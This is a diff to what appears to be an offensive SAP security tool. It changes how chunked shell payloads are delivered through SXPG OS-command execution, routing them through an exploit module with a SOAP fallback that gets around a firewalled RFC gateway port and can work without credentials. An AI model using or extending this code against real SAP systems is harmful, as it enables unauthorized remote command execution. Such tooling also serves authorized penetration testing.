@@ -9866,9 +9866,15 @@ def create_app(api: SAPMAPApi) -> Bottle:
                       f"{acc['username']}@{acc['target']}")
 
             else:
-                # SXPG: split EXTPROG + PARAMS
+                # SXPG: split EXTPROG + PARAMS.
+                # Phase 3b: go through execute_os_command (NOT raw
+                # sapmap_rfc.execute_local_command) so the soap_route
+                # fallback applies — without this, every chunked step
+                # and the final exec each spend 60-90s on pyrfc TCP
+                # retries to a firewalled gateway port = 10+ minutes
+                # total for a 9-chunk payload before the user gives up.
                 creds = node.best_credentials()
-                if not creds:
+                if not creds and not soap_route:
                     print(f"[-] {sid}: No credentials for SXPG shell")
                     with _shell_lock:
                         if _shell_session:
@@ -9884,16 +9890,19 @@ def create_app(api: SAPMAPApi) -> Bottle:
                             return
                         _set_progress(
                             f"Writing payload step {idx+1}/{total}...")
-                        sapmap_rfc.execute_local_command(
+                        sapmap_exploit.execute_os_command(
                             node, step["command"], step["params"],
-                            creds)
+                            creds=creds, soap_route=soap_route,
+                            prefer="sxpg")
                 _set_progress("Executing payload...")
                 sxpg_cmd = payload.get("sxpg_command",
                                        payload["command"])
                 sxpg_params = payload.get("sxpg_params",
                                           payload["params"])
-                result = sapmap_rfc.execute_local_command(
-                    node, sxpg_cmd, sxpg_params, creds)
+                result = sapmap_exploit.execute_os_command(
+                    node, sxpg_cmd, sxpg_params,
+                    creds=creds, soap_route=soap_route,
+                    prefer="sxpg")
 
             if result.get("success"):
                 print(f"[+] {sid}: Shell payload delivered")
